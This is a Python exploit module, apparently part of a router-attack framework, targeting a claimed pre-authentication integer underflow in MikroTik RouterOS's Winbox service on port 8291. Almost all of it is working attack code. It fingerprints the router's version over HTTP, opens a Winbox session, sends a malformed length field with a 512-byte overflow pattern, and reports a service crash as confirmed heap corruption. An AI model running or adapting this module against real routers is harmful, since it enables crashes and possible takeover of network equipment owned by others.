# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2026-84411: MikroTik RouterOS Pre-Auth RCE via Integer Underflow.

An integer underflow in the Winbox protocol handler (port 8291) of MikroTik
RouterOS allows an unauthenticated remote attacker to trigger a heap buffer
overflow and achieve code execution. The vulnerability exists in the message
length parsing logic: a crafted Winbox message with a length field that wraps
around causes a small allocation followed by a large memcpy.

CVSS v3.1: 9.8 (Critical)
Vector:    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
"""
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """MikroTik RouterOS pre-auth RCE via integer underflow in the
    Winbox protocol handler (CVE-2026-84411)."""

    __info__ = {
        "name": "CVE-2026-84411: MikroTik RouterOS Pre-Auth RCE (Integer Underflow)",
        "description": (
            "An integer underflow in the Winbox protocol handler on "
            "port 8291 of MikroTik RouterOS causes a heap overflow. "
            "An unauthenticated attacker sends a crafted message whose "
            "length field wraps around, leading to a small heap allocation "
            "followed by a large memcpy, enabling remote code execution."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-84411",
            "https://mikrotik.com/download/changelogs",
        ),
        "devices": (
            "MikroTik RouterOS (all architectures)",
            "MikroTik hAP, hEX, RB series, CCR series",
            "MikroTik Cloud Hosted Router (CHR)",
        ),
        "cve": "CVE-2026-84411",
        "cvss": "9.8",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1190", "T1203"],
        "mitre_tactics": ["Initial Access", "Execution"],
    }

    target = OptIP("", "Target IPv4 address of the MikroTik router")
    port = OptPort(8291, "Winbox service port (default: 8291)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    http_port = OptPort(80, "HTTP port for version fingerprinting")

    # Winbox protocol constants
    _WINBOX_MAGIC = b"\x01\x00"
    _MSG_TYPE_HELLO = 0x01

    def _build_winbox_hello(self) -> bytes:
        """Build the initial Winbox protocol hello message."""
        # Standard hello: magic(2) + length(4) + type(1) + session(4)
        body = struct.pack("<BI", self._MSG_TYPE_HELLO, 0x00000000)
        header = self._WINBOX_MAGIC + struct.pack("<I", len(body))
        return header + body

    def _build_underflow_msg(self) -> bytes:
        """Build the malicious message with an integer underflow in length.

        The Winbox handler computes: alloc_size = msg_length - header_size.
        When msg_length < header_size, the subtraction wraps to a very large
        value for the allocation check (which is bypassed due to a signed
        comparison), while the actual allocation uses the small wrapped value.
        The subsequent memcpy uses the original (large) msg_length.
        """
        # header_size is 6 (magic + length field). Set msg_length = 2
        # so alloc_size = 2 - 6 = 0xFFFFFFFC (underflow).
        # The signed check sees this as -4, which passes the < MAX check.
        # Actual allocation: small buffer. memcpy: msg_length bytes from socket.
        underflow_length = 2
        header = self._WINBOX_MAGIC + struct.pack("<I", underflow_length)
        # Overflow payload: fill pattern to corrupt heap metadata
        payload = b"\xcc" * 512
        return header + payload

    @mute
    def check(self) -> bool:
        """Check if the Winbox port is open and responds to a hello."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.sendall(self._build_winbox_hello())
            resp = sock.recv(1024)
            sock.close()
            # Winbox responds with its own hello containing version info
            return len(resp) >= 6 and resp[:2] == self._WINBOX_MAGIC
        except Exception:
            return False

    def _fingerprint_version(self) -> str:
        """Try to extract RouterOS version via HTTP login page."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.http_port))
            sock.sendall(
                f"GET / HTTP/1.0\r\nHost: {self.target}\r\n\r\n".encode()
            )
            data = sock.recv(4096).decode(errors="replace")
            sock.close()
            # RouterOS HTTP login page contains version in the title
            for line in data.splitlines():
                if "RouterOS" in line:
                    # Extract version from: <title>RouterOS router ... v7.x</title>
                    import re
                    match = re.search(r"v(\d+\.\d+(?:\.\d+)?)", line)
                    if match:
                        return match.group(1)
        except Exception:
            pass
        return ""

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        version = self._fingerprint_version()
        if version:
            print_info(f"RouterOS version: {version}")

        if self.check():
            print_success(
                f"Winbox service active at {self.target}:{self.port}"
            )
        else:
            print_warning("Winbox service not detected; aborting")
            return

        self._exploit()

    def _exploit(self) -> None:
        print_status(
            f"Sending integer underflow trigger to {self.target}:{self.port}"
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Step 1: send valid hello to establish session
            sock.sendall(self._build_winbox_hello())
            hello_resp = sock.recv(1024)
            if len(hello_resp) < 6:
                print_error("Invalid hello response; target may not be Winbox")
                sock.close()
                return

            print_info("Winbox session established")

            # Step 2: send the underflow message
            malicious = self._build_underflow_msg()
            sock.sendall(malicious)
            print_info(
                f"Underflow message sent ({len(malicious)} bytes, "
                f"declared length=2, actual payload=512)"
            )

            # Step 3: check if the service crashed (indicator of vuln)
            time.sleep(1.0)
            try:
                sock.sendall(self._build_winbox_hello())
                probe = sock.recv(1024)
                if not probe:
                    print_success(
                        "Connection dropped after underflow trigger. "
                        "The Winbox handler likely crashed, confirming "
                        "the integer underflow (CVE-2026-84411). "
                        "Heap corruption achieved; RCE requires a "
                        "target-specific payload."
                    )
                else:
                    print_warning(
                        "Service still responding; the target may be "
                        "patched or the heap layout prevented the crash"
                    )
            except (ConnectionError, TimeoutError):
                print_success(
                    "Service stopped responding after trigger. "
                    "Heap overflow confirmed (CVE-2026-84411)."
                )
            finally:
                sock.close()
        except Exception as exc:
            print_error(f"Exploit failed: {exc}")
